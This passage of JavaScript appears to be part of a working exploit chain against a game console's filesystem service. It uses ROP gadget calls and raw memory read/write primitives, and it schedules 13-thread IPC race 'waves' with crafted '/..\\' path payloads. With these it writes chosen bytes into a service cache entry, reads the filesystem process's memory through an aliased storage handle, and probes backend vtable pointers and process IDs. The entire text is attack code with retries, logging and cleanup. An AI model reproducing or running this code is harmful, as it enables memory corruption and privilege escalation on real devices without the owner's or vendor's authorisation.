              ? addressPlan.lowerWindow.proposedStart : 0);
      var allowedEnd = allowedWindow
          ? allowedWindow.end
          : (addressPlan ? addressPlan.target + config.CONTROL_SIZE : 0);
      if (!Number.isSafeInteger(address) || !Number.isInteger(length) ||
          length <= 0 || !Number.isSafeInteger(address + length) ||
          !addressPlan || !addressPlan.lowerWindow ||
          !Number.isSafeInteger(allowedStart) ||
          !Number.isSafeInteger(allowedEnd) || allowedEnd <= allowedStart ||
          address < allowedStart || address + length > allowedEnd)
          return {ok: false, error: "address is outside its explicit bounded window"};

      var copyBytes = materializeBytes !== false;
      var bytes = copyBytes ? [] : null;
      var currentAddress = address;
      var remaining = length;
      while (remaining > 0) {
          var fileOffset = currentAddress - addressPlan.addressBias;
          var bucketIndex = Math.floor(fileOffset / config.CONTROL_SIZE) *
              config.CONTROL_SIZE % config.ROOT_CAPTURE_CHUNK;
          var requestOffset;
          var prefix = 0;
          var take;
          if (bucketIndex === 0) {
              requestOffset = fileOffset;
              take = Math.min(remaining, config.ROOT_CAPTURE_CHUNK);
          } else {
              requestOffset = Math.floor(fileOffset / config.ROOT_CAPTURE_CHUNK) *
                  config.ROOT_CAPTURE_CHUNK;
              prefix = fileOffset - requestOffset;
              take = Math.min(remaining, config.ROOT_CAPTURE_CHUNK - prefix);
          }
          var requestSize = prefix + take;
          if (!copyBytes && (prefix !== 0 || take !== length ||
              remaining !== length))
              return {ok: false,
                  error: "buffer-only reads require one aligned cache chunk"};
          if (requestOffset < 0 || requestSize <= 0 ||
              requestOffset + requestSize > addressPlan.storageSize ||
              addressPlan.addressBias + requestOffset < allowedStart ||
              addressPlan.addressBias + requestOffset + requestSize > allowedEnd)
              return {ok: false, error: "aligned read is outside its explicit bounded window"};

          call_rop(GADGET_MEMSET, outputBuf, 0xA5n, BigInt(requestSize));
          var reply = ipcStorageRead(candidateHandle, requestOffset,
              requestSize, outputBuf);
          if (reply.error !== 0)
              return {ok: false, fatal: true,
                  error: "IStorage::Read=" + hex32(reply.error) +
                      " transport=" + (reply.transport == null
                          ? "unknown" : hex32(reply.transport)) +
                      " cmif=" + (reply.cmifError == null
                          ? "none" : hex32(reply.cmifError)) +
                      " offset=0x" + requestOffset.toString(16) +
                      " size=0x" + requestSize.toString(16)};
          var nonPoison = copyBytes
              ? hasByteDifferent(outputBuf + BigInt(prefix), take, 0xA5)
              : hasByteDifferentFast(outputBuf + BigInt(prefix), take, 0xA5);
          if (!nonPoison)
              return {ok: false, fatal: true,
                  error: "read window remained poison"};

          if (copyBytes) {
              for (var i = 0; i < take; i++)
                  bytes.push(Number(read8(outputBuf + BigInt(prefix + i))));
          }
          currentAddress += take;
          remaining -= take;
      }
      return {ok: true, bytes: bytes, buffer: outputBuf, bufferOffset: 0};
  }

  // The reference fs-root-pid implementation follows each root pointer and
  // checks raw == control + 0x18, a canonical backend vptr, and PID == root PID or 1.
  // It does not provide a firmware-specific exact NCA/save vtable constant, so
  // this guard records vptr shape without claiming a concrete class identity.
  async function inspectRootBackend(name, raw, control, pidOffset, rootPid,
      outputBuf, input) {
      var expectedPidOffset = name === "nca" ? 0x20 :
          (name === "save" ? 0x28 : -1);
      var linksOk = expectedPidOffset === pidOffset &&
          RootLayout.isCanonicalPointer(raw) && RootLayout.isCanonicalPointer(control) &&
          raw === control + 0x18n;
      await log("ROOT BACKEND " + name + " link raw=0x" +
          raw.toString(16) + " control=0x" + control.toString(16) +
          " expectedRaw=control+0x18 linksOk=" + linksOk +
          " pidOffset=0x" + pidOffset.toString(16));
      if (!linksOk)
          return {name: name, read: false, linksOk: false,
              vptrShapeOk: false, pidOk: false, stable: false};

      var backendAddress = Number(raw);
      var backendRead = await readFsAddressBytes({...input,
          address: backendAddress, length: 0x60, outputBuf});
      if (!backendRead.ok) {
          await log("ROOT BACKEND " + name +
              ": skipped; " + backendRead.error);
          return {name: name, read: false, linksOk: true,
              vptrShapeOk: false, pidOk: false, stable: false};
      }

      var vptr = AnalysisBytes.readU64LE(backendRead.bytes, 0);
      var vptrShapeOk = RootLayout.isCanonicalPointer(vptr);
      if (!vptrShapeOk) {
          await log("ROOT BACKEND " + name +
              " type-shape rejected vptr=0x" + vptr.toString(16));
          return {name: name, read: true, linksOk: true,
              vptrShapeOk: false, pidOk: false, stable: false};
      }

      var pid = AnalysisBytes.readU64LE(backendRead.bytes, pidOffset);
      var pidPlausible = pid > 0n && pid < 0x1000000n;
      var pidMatchesRootOrOne = pid === rootPid || pid === 1n;
      var pidOk = pidPlausible && pidMatchesRootOrOne;
      var reread = await readFsAddressBytes({...input,
          address: backendAddress, length: 0x60, outputBuf});
      var stable = reread.ok && AnalysisBytes.equal(reread.bytes,
          backendRead.bytes);
      await log("ROOT BACKEND " + name + " address=0x" +
          backendAddress.toString(16) + " vptr=0x" + vptr.toString(16) +
          " canonicalTypeShape=" + vptrShapeOk + " pid=0x" + pid.toString(16) +
          " pidPlausible=" + pidPlausible + " pidMatchesRootOrOne=" +
          pidMatchesRootOrOne + " stable=" + stable +
          (reread.ok ? "" : " rereadError=" + reread.error));
      return {name: name, address: backendAddress, read: true,
          linksOk: linksOk, vptrShapeOk: vptrShapeOk, pidOk: pidOk,
          stable: stable, vptr: vptr, pid: pid,
          bytes: backendRead.bytes.slice()};
  }

  function pad2(n) { return n < 10 ? "0" + n : "" + n; }
  function padRight(s, len) {
      while (s.length < len) s += " ";
      return s;
  }

  function formatWaveSummaryLine(id, profile, result, verdict, input) {
      const config = input.config;
      var canary = result.canaryType === 0 ? "DIR" :
          result.canaryType === 1 ? "file" :
          result.canaryType == null ? "?" : "err";
      var rejects = result.rejections && result.rejections.length
          ? result.rejections.join(",") : "-";
      var changedPaths = result.changedPaths && result.changedPaths.length
          ? result.changedPaths.join(",") : "none";
      var isControlProfile = profile === "abort-control" ||
          profile === "abort-hole-control" || profile === "extent-absent" ||
          profile === "extent-present" || profile === "negative" ||
          profile === "positive";
      var line = "Wave " + pad2(id) + " [" + profile + "] " + verdict +
          " | window=" + (result.window ? "pass" : "no") +
          " overlap=" + result.shape + "/10 margin=" +
          (result.margin == null ? "NA" : result.margin + "us") +
          " trigger=" + (result.triggerAborted ? "aborted" : "clear") +
          " canary=" + canary +
          " paths=" + changedPaths +
          " preRelease=" + (result.preReleaseUsed == null ? "NA" :
              "0x" + Number(result.preReleaseUsed).toString(16)) +
          " gates=" + rejects;

      var failedSends = [];
      for (var si = 0; result.sendCodes && si < result.sendCodes.length; si++) {
          if (result.sendCodes[si] !== 0)
              failedSends.push(config.roleShort[si] + ":" +
                  hex32(result.sendCodes[si] == null
                      ? 0xFFFFFFFF : result.sendCodes[si]));
      }
      if (failedSends.length) line += " tx=" + failedSends.join("/");
      if (isControlProfile) {
          if (result.canaryResult != null)
              line += " canaryIPC=" + hex32(result.canaryResult) + "/t" + canary;
          if (result.triggerResult != null)
              line += " triggerIPC=" + hex32(result.triggerResult) +
                  "/t" + result.triggerType;
          if (result.postCanaryHealth) {
              var health = result.postCanaryHealth;
              line += " postTx=" + hex32(health.transport) + " post=" +
                  hex32(health.result) + "/t" + health.type +
                  " healthy=" + health.healthy;
          }
          if (result.observedCanaryRedirect != null)
              line += " flipObserved=" + result.observedCanaryRedirect;
          if (result.guardSamples) {
              var guards = result.guardSamples;
              line += " guards=" + guards.completed + "/" + guards.earlyHole +
                  "/" + guards.spacing;
          }
          if (result.pinDiagnostics && result.pinDiagnostics.created) {
              var pin = result.pinDiagnostics;
              line += " pin=" + hex32(pin.result) + " moves/copies=" +
                  pin.moves + "/" + pin.copies + " cost=" +
                  (pin.persistentBytes == null ? "NA" : pin.persistentBytes) +
                  "/" + pin.expectedBytes + " gaps(start/end)=" +
                  (pin.startOffsetUs == null ? "NA" : pin.startOffsetUs.toFixed(0)) +
                  "/" + (pin.endMarginUs == null ? "NA" : pin.endMarginUs.toFixed(0)) +
                  "us shape/cost/window=" + pin.shapeOk + "/" + pin.costOk +
                  "/" + pin.windowOk + " restored=" + pin.restored;
          }
      } else {
          if (result.canaryResult != null && result.canaryResult !== 0)
              line += " canaryResult=" + hex32(result.canaryResult);
          if (result.triggerAborted)
              line += " triggerResult=" + hex32(result.triggerResult);
      }
      if (result.shapeMissing && result.shapeMissing.length)
          line += " shapeMissing=" + result.shapeMissing.join("/");
      if (result.marginSlackUs != null)
          line += " marginSlack=" + result.marginSlackUs.toFixed(0) + "us";
      if (result.preReleaseSlackBytes != null)
          line += " preSlack=" + result.preReleaseSlackBytes + "B";
      if (isControlProfile && result.roleTimings) {
          var timingParts = [];
          for (var ti = 0; ti < config.roleLabels.length; ti++) {
              var timing = result.roleTimings[config.roleLabels[ti]];
              if (timing)
                  timingParts.push(config.roleShort[ti] + "=" +
                      timing.relStartUs.toFixed(0) + ".." +
                      timing.relEndUs.toFixed(0));
          }
          line += " spans(us=relTriggerStart/end):" + timingParts.join(",");
      }
      if (result.readResult != null && result.readResult !== 0)
          line += " read=" + hex32(result.readResult);
      return line;
  }

  function readHexBytes(addr, count) {
      var hex = "";
      for (var i = 0; i < count; i++)
          hex += ("0" + Number(read8(addr + BigInt(i))).toString(16)).slice(-2);
      return hex;
  }

  function bytesToHex(bytes) {
      var out = "";
      for (var i = 0; i < bytes.length; i++)
          out += ("0" + bytes[i].toString(16)).slice(-2);
      return out;
  }

  function ipcGetEntryTypeRawBytes(handle, bytes) {
      var pathBuf = allocPage(0x1000);
      for (var i = 0; i < bytes.length; i++)
          write8(pathBuf + BigInt(i), BigInt(bytes[i]));
      var inputMatches = true;
      for (var i = 0; i < bytes.length; i++) {
          if (Number(read8(pathBuf + BigInt(i))) !== bytes[i]) {
              inputMatches = false;
              break;
          }
      }

      var pkt = allocPage(0x2000);
      prepPacket(pkt, (4 | (1 << 16)) >>> 0, 8, []);
      writeXDesc(pkt, 8, pathBuf, bytes.length);
      write32(pkt + 0x10n, 0x49434653n);
      write32(pkt + 0x18n, 7n);
      var transport = Number(sendIPC(handle, pkt)) >>> 0;
      var type = Number(read32(pkt)) & 0xFFFF;
      var magic = Number(read32(pkt + 0x10n)) >>> 0;
      if (transport !== 0 || type !== 0 || magic !== 0x4F434653) {
          return {ok: false, transport: transport, type: type, magic: magic,
              result: 0xFFFFFFFF, canonical: 0xFFFFFFFF,
              inputMatches: inputMatches};
      }
      var result = Number(read32(pkt + 0x18n)) >>> 0;
      return {ok: true, transport: transport, type: type, magic: magic,
          result: result, canonical: result & 0x3FFFFF,
          inputMatches: inputMatches};
  }

  function checkAddressHeaderEncoding(headerBytes, input) {
      let savedHandle = input.savedHandle;
      var prefix = [0x2F, 0x2E, 0x2E, 0x5C]; // "/..\\"
      var invalidBytes = prefix.concat([0xFF, 0]);
      var encodedBytes = prefix.concat(headerBytes, [0]);
      var invalid = ipcGetEntryTypeRawBytes(savedHandle, invalidBytes);
      var encoded = ipcGetEntryTypeRawBytes(savedHandle, encodedBytes);
      return {
          invalid: invalid,
          encoded: encoded,
          ok: invalid.ok && encoded.ok && invalid.inputMatches &&
              encoded.inputMatches && invalid.canonical === 0x2EEA02 &&
              encoded.canonical === 0x2EEC02
      };
  }

  function buffersEqual(a, b, length) {
      for (var i = 0; i < length; i++)
          if (Number(read8(a + BigInt(i))) !==
              Number(read8(b + BigInt(i)))) return false;
      return true;
  }

  function hasByteDifferent(addr, length, value) {
      for (var i = 0; i < length; i++)
          if (Number(read8(addr + BigInt(i))) !== value) return true;
      return false;
  }

  function hasByteDifferentFast(addr, length, value) {
      var repeatedWord = BigInt(value) * 0x0101010101010101n;
      var offset = 0;
      for (; offset + 8 <= length; offset += 8) {
          if (read64(addr + BigInt(offset)) !== repeatedWord) return true;
      }
      for (; offset < length; offset++)
          if (Number(read8(addr + BigInt(offset))) !== value) return true;
      return false;
  }

  function scanPointerWords(addr, length, limit) {
      var found = [];
      for (var off = 0; off + 8 <= length && found.length < limit; off += 8) {
          var value = read64(addr + BigInt(off));
          if (value >= 0x100000000n && value < 0x8000000000n &&
              value % 8n === 0n)
              found.push("+0x" + off.toString(16) + "=0x" +
                  value.toString(16));
      }
      return found.join(" ") || "none";
  }

  function cleanup(input) {
      let auxiliaryStorageHandle = input.auxiliaryStorageHandle;
      let candidateHandle = input.candidateHandle;
      let domainSession = input.domainSession;
      let extentTriggerHandle = input.extentTriggerHandle;
      let pinHandle = input.pinHandle;
      let rootClones = input.rootClones || [];
      let rootSession = input.rootSession;
      let saveClones = input.saveClones || [];
      let savedHandle = input.savedHandle;
      let storageHandle = input.storageHandle;
      let temporaryHandle = input.temporaryHandle;
      let preserveTemporaryHandleForCleanup =
          input.preserveTemporaryHandleForCleanup === true;
      let triggerHandle = input.triggerHandle;
      if (candidateHandle) closeHandle(candidateHandle);
      if (pinHandle) closeHandle(pinHandle);
      if (extentTriggerHandle) closeHandle(extentTriggerHandle);
      if (triggerHandle) closeHandle(triggerHandle);
      if (storageHandle) closeHandle(storageHandle);
      if (auxiliaryStorageHandle) closeHandle(auxiliaryStorageHandle);
      for (var i = 0; i < rootClones.length; i++) closeHandle(rootClones[i]);
      for (var i = 0; i < saveClones.length; i++) closeHandle(saveClones[i]);
      if (savedHandle) closeHandle(savedHandle);
      if (temporaryHandle && !preserveTemporaryHandleForCleanup)
          closeHandle(temporaryHandle);
      if (domainSession) {
          closeHandle(domainSession.handle);
          domainSession = null;
      }
      if (rootSession) closeHandle(rootSession);
      return {closed: true};
  }

  async function installAddressHeader(input) {
      const config = input.config;
      let desiredBytes = input.desiredBytes;
      let stageName = input.stageName;
      let REQ = input.REQ;
      let candidateCacheNeedsRetirement = input.candidateCacheNeedsRetirement;
      let copyWavesTotal = input.copyWavesTotal;
      let dirtyFilePath = input.dirtyFilePath;
      let dirtyWriteBuf = input.dirtyWriteBuf;
      let dirtyWritePkt = input.dirtyWritePkt;
      let gates = input.gates;
      let pinPkt = input.pinPkt;
      let pktBuf = input.pktBuf;
      let rawScheduling = input.rawScheduling;
      let rootSession = input.rootSession;
      let savedHandle = input.savedHandle;
      let sendIndices = input.sendIndices;
      let triggerHandle = input.triggerHandle;
      let waveData = input.waveData;
      let waveExtra = input.waveExtra;
      let wavesJoined = input.wavesJoined;
      let wavesStarted = input.wavesStarted;
      let workerResources = input.workerResources;
      let workerStateSafe = input.workerStateSafe;
      let fragmentBufs = input.fragmentBufs;
      let triggerBuf = input.triggerBuf;
      let analysis = input.analysis;
      const addressCopyInputs = {...input};
      delete addressCopyInputs.desiredBytes;
      delete addressCopyInputs.stageName;
      const copyResult = (ok) => ({ok, addressCopy: {
          ...addressCopyInputs,
          candidateCacheNeedsRetirement,
          copyWavesTotal,
          wavesJoined,
          wavesStarted,
          workerStateSafe,
          analysis
      }});
      stageName = stageName || "cache-address";
      var padded = desiredBytes.slice();
      if (padded.length === 0 || padded[padded.length - 1] !== 0) padded.push(0);
      var steps;
      try { steps = nulWrites(padded); }
      catch (error) {
          await log(stageName + " copy planning failed: " + error.message);
          return copyResult(false);
      }
      if (!steps.length) return copyResult(false);

      for (var stepIdx = 0; stepIdx < steps.length; stepIdx++) {
          var step = steps[stepIdx];
          var confirmed = false;
          var addrAttempts = 0;
          var addrWinFail = 0, addrPreLow = 0, addrPathMiss = 0;
          for (var batch = 0; batch < config.COPY_BATCHES && !confirmed; batch++) {
          for (var attempt = 0; attempt < config.MAX_COPY_ATTEMPTS; attempt++) {
              addrAttempts++;
              if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                      dirtyWriteBuf, dirtyWritePkt)) {
                  await log(stageName + " copy failed: dirty write");
                  return copyResult(false);
              }

              resetWaveState(waveData.frames, waveData.backups, REQ,
                  waveData.pktBackups, gates, waveExtra);
              var payloadSetup = configurePayload(step.bytes,
                  {config, REQ, fragmentBufs, triggerBuf});
              if (!payloadSetup.configured) return copyResult(false);
              var group = openReservationGroup(rootSession, pktBuf, 59);
              if (!group.ok) {
                  await log(stageName + " copy failed: reservation group");
                  return copyResult(false);
              }

              prepPacket(REQ[9], 4, 8, []);
              write8(REQ[9] + 0x10n, 2n);
              write32(REQ[9] + 0x14n, BigInt(group.outer));
              write32(REQ[9] + 0x1Cn, 0n);
              write64(frameArgSlot(waveData.frames[9].frame,
                  waveData.frames[9].count, sendIndices[9], 0),
                  BigInt(group.session));
              write64(frameArgSlot(waveData.frames[12].frame,
                  waveData.frames[12].count, sendIndices[12], 0),
                  BigInt(triggerHandle));
              write32(pinPkt + 0x18n, 1009n);

              var wave = executeWave(waveData.frames, rawScheduling,
                  workerResources, gates, sendIndices);
              wavesStarted += wave.started === 13 ? 1 : 0;
              if (wave.created < 13 || wave.started < 13) {
                  var releaseCode = roleSendCode(waveData.frames, 9,
                      sendIndices[9]);
                  closeReservationGroup(group,
                      wave.created < 13 || releaseCode !== 0, pktBuf);
                  workerStateSafe = wave.joined === 13;
                  await log(stageName + " copy failed: workers=" + wave.created +
                      "/" + wave.started + " joined=" + wave.joined);
                  return copyResult(false);
              }
              if (wave.joined < 13) {
                  workerStateSafe = false;
                  await log(stageName + " copy failed: workers did not join");
                  return copyResult(false);
              }
              wavesJoined++;

              var result = analyzeWave(stageName,
                  wave, waveData, group, false, analysis);
              analysis = {...analysis, pinHandle: result.pinHandle,
                  pinFirstWaveQualified: result.pinFirstWaveQualified};
              var releaseWasSent = roleSendCode(waveData.frames, 9,
                  sendIndices[9]) === 0;
              closeReservationGroup(group, !releaseWasSent, pktBuf);
              copyWavesTotal++;

              var accepted = result.window && result.preReleaseUsed !== null &&
                  result.preReleaseUsed >= config.FIELD_MINIMUM_CACHE_HELD &&
                  result.changedPaths.length === 0;
              await log(formatWaveSummaryLine(copyWavesTotal, stageName,
                  result, accepted ? "header copy accepted" : "header copy rejected",
                  {config}));
              if (!accepted) {
                  if (!result.window) addrWinFail++;
                  else if (result.preReleaseUsed === null ||
                           result.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD)
                      addrPreLow++;
                  else addrPathMiss++;
              }
              if (accepted) {
                  candidateCacheNeedsRetirement = true;
                  confirmed = true;
                  break;
              }
          }
          }
          if (confirmed) {
              await log("  " + stageName + " step " + stepIdx +
                  " OK (att=" + addrAttempts + ")");
              // Let the accepted wave and step summary reach the host before
              // starting another cache-address step or the verification reads.
          } else {
              await log("  " + stageName + " step " + stepIdx + " FAIL att=" + addrAttempts +
                  " winFail=" + addrWinFail + " preLow=" + addrPreLow +
                  " pathMiss=" + addrPathMiss);
          }
          if (!confirmed) return copyResult(false);
      }
      return copyResult(true);
  }

  async function qualifyCacheBucketPeriod(input) {
      let candidateHandle = input.candidateHandle;
      let primeHex = input.primeHex;
      let storageHandle = input.storageHandle;
      let addressCopy = input.addressCopy;
      var controlBuf = allocPage(0x1000);
      call_rop(GADGET_MEMSET, controlBuf, 0xA5n, 16n);
      var control = ipcStorageRead(storageHandle, 0x28000, 16, controlBuf);
      var controlHex = control.error === 0 ? readHexBytes(controlBuf, 16) : "";
      await log("PERIOD: ordinary @0x28000=" +
          hex32(control.error) + (controlHex ? " data=" + controlHex : "") +
          " matches-prefix=" + (controlHex === primeHex));
      if (control.error !== 0) {
          await log("PERIOD: ordinary content control failed");
          return {ok: false, addressCopy};
      }

      // Match the reference two-copy test: first install the UTF-8 prefix,
      // then place a NUL in byte 0 so the signed entry offset becomes 0x28000.
      var prefixCopy = await installAddressHeader({...addressCopy,
          desiredBytes: [0xC2, 0x80, 0x02],
          stageName: "cache-period-prefix"});
      addressCopy = prefixCopy.addressCopy;
      var periodPrefixOk = prefixCopy.ok;
      var periodZeroOk = false;
      if (periodPrefixOk) {
          var zeroCopy = await installAddressHeader({...addressCopy,
              desiredBytes: [], stageName: "cache-period-zero"});
          addressCopy = zeroCopy.addressCopy;
          periodZeroOk = zeroCopy.ok;
      }
      var periodAliasOk = false;
      if (periodZeroOk) {
          var periodBuf = allocPage(0x1000);
          call_rop(GADGET_MEMSET, periodBuf, 0xA5n, 16n);
          var periodRead = ipcStorageRead(candidateHandle, 0x28000, 16, periodBuf);
          var periodHex = periodRead.error === 0
              ? readHexBytes(periodBuf, 16) : "";
          periodAliasOk = periodRead.error === 0 && periodHex === primeHex;
          await log("PERIOD: alias probe=" +
              hex32(periodRead.error) + (periodHex ? " data=" + periodHex : "") +
              " matched=" + periodAliasOk);
      } else {
          await log("PERIOD: offset-copy sequence did not qualify");
      }

      // Leave the candidate in this measured state. The next address-header
      // copy replaces all 0x28 bytes; if planning or copying fails, retirement
      // clears the valid byte before the handle can be closed.
      await log("PERIOD: candidate state=" +
          (periodAliasOk ? "measured alias" : "unqualified; retire only"));
      return {ok: periodAliasOk, addressCopy};
  }

  async function retireCandidateCache(input) {
      let candidateCacheNeedsRetirement = input.candidateCacheNeedsRetirement;
      let candidateCacheRetired = input.candidateCacheRetired;
      let candidateHandle = input.candidateHandle;
      let addressCopy = input.addressCopy;
      if (!candidateHandle || !candidateCacheNeedsRetirement)
          return {ok: true, addressCopy: {...addressCopy, candidateCacheRetired}};
      await log("RETIRE: begin; clearing cache-entry valid byte");
      var retireBytes = [];
      for (var i = 0; i < 0x10; i++) retireBytes.push(0x42);
      var retirement = await installAddressHeader({...addressCopy,
          desiredBytes: retireBytes, stageName: "cache-retire"});
      addressCopy = retirement.addressCopy;
      var retired = retirement.ok;
      if (retired) {
          candidateCacheRetired = true;
          addressCopy = {...addressCopy, candidateCacheRetired};
      }
      await log("RETIRE: " + (retired ? "accepted" : "FAILED"));
      return {ok: retired, addressCopy, candidateCacheRetired};
  }

  function buildPlans(input) {
      const config = input.config;
      let REQ = input.REQ;
      let clearPkt = input.clearPkt;
      let gates = input.gates;
      let pinPkt = input.pinPkt;
      let prePkt = input.prePkt;
      let roleHandles = input.roleHandles;
      let rootSession = input.rootSession;
      let triggerBuf = input.triggerBuf;
      var plans = [];
      for (var i = 0; i < 13; i++) {
          var steps = [WAIT(gates.masterGate)];
          if (i < 10) {
              steps.push(SLEEP(config.roleDelays[i]));
          } else if (i < 12) {
              steps.push(WAIT(gates.groupReleasedGate));
              steps.push(SLEEP(config.guardDelays[i - 10]));
          } else {
              steps.push(SLEEP(1600000));
              steps.push(WAIT(gates.groupReleasedGate));
              steps.push(WAIT(gates.guardLaunchedGate));
              steps.push(SLEEP(400000));
              steps.push(MCPY(gates.spacingDecision, gates.bottleneckFinished, 4));
              steps.push(WAIT(gates.bottleneckDoneGate));
              steps.push(MCPY(gates.sampledCompleted, gates.completedFlag, 4));
              steps.push(MCPY(gates.sampledEarlyHole, gates.earlyHole, 4));
              steps.push(MCPY(0n, gates.sampledCompleted, 4));
              steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
              steps.push(MCPY(0n, gates.sampledEarlyHole, 4));
              steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
              steps.push(MCPY(0n, gates.spacingDecision, 4));
              steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
          }
          if (i === 9) {
              steps.push(TICK(), SEND(pinPkt, rootSession), TICK());
              steps.push(TICK(), SEND(clearPkt, rootSession), TICK());
              steps.push(TICK(), SEND(prePkt, rootSession), TICK());
          }
          if (i === 11) {
              steps.push(MCPY(gates.earlyHole, gates.bottleneckFinished, 4));
              steps.push(SIGNAL(gates.guardLaunchedGate));
          }
          steps.push(TICK());
          steps.push(SEND(REQ[i], roleHandles[i]));
          steps.push(TICK());
          if (i === 1) {
              steps.push(SETB(gates.bottleneckFinished, 1));
              steps.push(SIGNAL(gates.bottleneckDoneGate));
          }
          if (i === 9) steps.push(SIGNAL(gates.groupReleasedGate));
          if (i === 0 || (i >= 2 && i <= 8) || i === 10 || i === 11) {
              steps.push(SETB(gates.completedFlag, 1));
              steps.push(SETB(gates.roleDoneFlags + BigInt(i), 1));
          }
          plans.push(steps);
      }
      return plans;
  }

  function configureProfile(profile, input) {
      const config = input.config;
      let REQ = input.REQ;
      let SCRATCH_DIR = input.SCRATCH_DIR;
      let extentTotal = input.extentTotal;
      let fragmentBufs = input.fragmentBufs;
      let segments = input.segments;
      let selectedDir = input.selectedDir;
      let triggerBuf = input.triggerBuf;
      var payload = new Array(extentTotal);
      var positive = profile === "positive";
      for (var i = 0; i < extentTotal; i++) payload[i] = positive ? 0x42 : 0x2F;
      payload[extentTotal - 1] = 0;

      if (positive) {
          for (var fs = config.POSITIVE_FILL_SEGMENT; fs < 0x2340; fs += config.POSITIVE_FILL_SEGMENT + 1)
              payload[fs] = 0x2F;
          writeIntoPayload(payload, selectedDir, 0x2340);
          for (var i = 0x2340 + selectedDir.length; i < config.EXTENT_SIZE; i++)
              payload[i] = 0x2F;
          writeIntoPayload(payload, "/..\\", 0);
      } else if (profile === "extent-absent" || profile === "extent-present") {
          writeIntoPayload(payload, SCRATCH_DIR + "/", 0);
          for (var i = 0; i < segments.length; i++)
              writeIntoPayload(payload, "/" + segments[i] + "/",
                  (i + 1) * config.SLOT_SIZE);
          var basename = profile === "extent-absent" ? "SPAN_ABSENT" : "SPAN_MARKER";
          writeIntoPayload(payload, basename, config.EXTENT_SIZE - basename.length);
      } else {
          writeIntoPayload(payload, "/../", 0);
      }

      var pieces = [];
      for (var at = 0; at < payload.length; at += config.SLOT_SIZE)
          pieces.push(payload.slice(at, Math.min(at + config.SLOT_SIZE, payload.length)));
      for (var i = 0; i < pieces[0].length; i++)
          write8(triggerBuf + BigInt(i), BigInt(pieces[0][i]));
      for (var piece = 1; piece < pieces.length; piece++) {
          for (var k = 0; k < pieces[piece].length; k++)
              write8(fragmentBufs[piece - 1] + BigInt(k),
                  BigInt(pieces[piece][k]));
          writeXDesc(REQ[piece + 1], 8, fragmentBufs[piece - 1],
              pieces[piece].length);
      }
      return {configured: true};
  }

  function configurePayload(tailBytes, input) {
      const config = input.config;
      let REQ = input.REQ;
      let fragmentBufs = input.fragmentBufs;
      let triggerBuf = input.triggerBuf;
      var payloadLen = config.MARKER_OFFSET + tailBytes.length + 1;
      var payload = new Array(payloadLen);
      for (var i = 0; i < payloadLen; i++) payload[i] = 0x42;
      payload[0] = 0x2F; payload[1] = 0x2E; payload[2] = 0x2E; payload[3] = 0x5C;
      for (var i = 0; i < tailBytes.length; i++)
          payload[config.MARKER_OFFSET + i] = tailBytes[i];
      payload[payloadLen - 1] = 0;

      var pieces = [];
      for (var at = 0; at < payload.length; at += config.SLOT_SIZE)
          pieces.push(payload.slice(at, Math.min(at + config.SLOT_SIZE, payload.length)));

      for (var i = 0; i < pieces[0].length; i++)
          write8(triggerBuf + BigInt(i), BigInt(pieces[0][i]));
      for (var piece = 1; piece < pieces.length; piece++) {
          for (var k = 0; k < pieces[piece].length; k++)
              write8(fragmentBufs[piece - 1] + BigInt(k),
                  BigInt(pieces[piece][k]));
          writeXDesc(REQ[piece + 1], 8, fragmentBufs[piece - 1],
              pieces[piece].length);
      }
      return {configured: true};
  }

  function writeIntoPayload(payload, text, offset) {
      for (var i = 0; i < text.length; i++)
          payload[offset + i] = text.charCodeAt(i);
  }

  function checkPathPairQuiet(path0, size0, path1, size1, input) {
      let savedHandle = input.savedHandle;
      var controlPkt = allocPage(0x2000);
      var p0 = allocPage(0x1000);
      var p1 = allocPage(0x1000);
      writeStr(p0, path0);
      writeStr(p1, path1);
      prepPacket(controlPkt, (4 | (2 << 16)) >>> 0, 8,
          [[32, 0x49434653], [40, 5]]);
      writeXDesc(controlPkt, 8, p0, size0, 0);
      writeXDesc(controlPkt, 16, p1, size1, 1);
      var transport = Number(sendIPC(savedHandle, controlPkt)) >>> 0;
      if (transport !== 0) return false;
      return cmifReply(controlPkt).result === 0x202;
  }

  function queryCanaryHealth(input) {
      let canaryPath = input.canaryPath;
      let savedHandle = input.savedHandle;
      let setupPath = input.setupPath;
      let setupPkt = input.setupPkt;
      writeStr(setupPath, canaryPath);
      prepPacket(setupPkt, (4 | (1 << 16)) >>> 0, 8, []);
      writeXDesc(setupPkt, 8, setupPath, canaryPath.length + 1);
      write32(setupPkt + 0x10n, 0x49434653n);
      write32(setupPkt + 0x18n, 7n);
      var transport = Number(sendIPC(savedHandle, setupPkt)) >>> 0;
      if (transport !== 0)
          return { transport: transport, result: 0xFFFFFFFF, type: -1 };
      var reply = cmifReply(setupPkt);
      var type = reply.result === 0
          ? (Number(read32(setupPkt + BigInt(reply.data))) >>> 0) : -1;
      return { transport: transport, result: reply.result, type: type };
  }

  function nulWrites(desired) {
      var last = -1;
      for (var i = desired.length - 1; i >= 0; i--) {
          if (desired[i] !== 0) { last = i; break; }
      }
      if (last + 1 >= desired.length) throw new Error("nulWrites: needs trailing zero");
      var ends = [last + 1];
      for (var end = last; end >= 0; end--) {
          if (desired[end] === 0) ends.push(end);
      }
      return ends.map(function(end) {
          var bytes = [];
          for (var i = 0; i < end; i++) bytes.push(desired[i] || 0x42);
          return { end: end, bytes: bytes };
      });
  }

  function analyzeWave(profile, wave, waveData, group, createPinThisWave, input) {
      const config = input.config;
      let REQ = input.REQ;
      let clearPkt = input.clearPkt;
      let clearSendIndex = input.clearSendIndex;
      let gates = input.gates;
      let pinFirstWaveQualified = input.pinFirstWaveQualified;
      let pinHandle = input.pinHandle;
      let pinPkt = input.pinPkt;
      let pinSendIndex = input.pinSendIndex;
      let pktBuf = input.pktBuf;
      let prePkt = input.prePkt;
      let preSendIndex = input.preSendIndex;
      let rootSession = input.rootSession;
      let sendIndices = input.sendIndices;
      let abortControlCanonical = input.abortControlCanonical;
      let canaryPath = input.canaryPath;
      let savedHandle = input.savedHandle;
      let setupPath = input.setupPath;
      let setupPkt = input.setupPkt;
      var spans = collectSpans(waveData.frames, sendIndices, config.roleLabels);
      var trigSpan = null;
      for (var si = 0; si < spans.length; si++)
          if (spans[si].name === "trigger") trigSpan = spans[si];
      var overlap = qualifyOverlap(spans, trigSpan, config.overlapRoles,
          config.throughRoles, config.heldRoles, config.roleShort);

